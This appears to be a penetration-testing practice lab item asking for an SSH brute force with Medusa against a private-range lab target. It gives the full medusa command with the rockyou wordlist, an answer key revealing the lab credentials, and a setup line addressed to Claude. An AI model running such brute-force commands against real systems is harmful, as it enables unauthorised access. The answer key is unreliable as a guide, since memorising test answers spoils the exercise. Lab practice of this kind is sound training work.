# Q281 — Brute Force SSH Using Medusa

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | System Hacking / Password Cracking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `medusa` |
| **Time budget** | 8–12 min |

---

## 📝 Question

"Use Medusa (alternative to Hydra) to brute force SSH. Report the syntax difference from Hydra."

---

## 🎯 Flag Format

```
user=<username>; password=<pass>; tool=medusa
```

---

## ✅ Solution

```bash
medusa -h 192.168.52.129 -u msfadmin -P /usr/share/wordlists/rockyou.txt -M ssh -t 4
```

Medusa uses `-h` for host, `-M` for module (ssh, ftp, etc.)

**Answer:** `user=msfadmin; password=msfadmin; tool=medusa`

---

## 🤖 Claude Setup Prompt

Ensure SSH on target. Report back: "Lab ready for Q281"
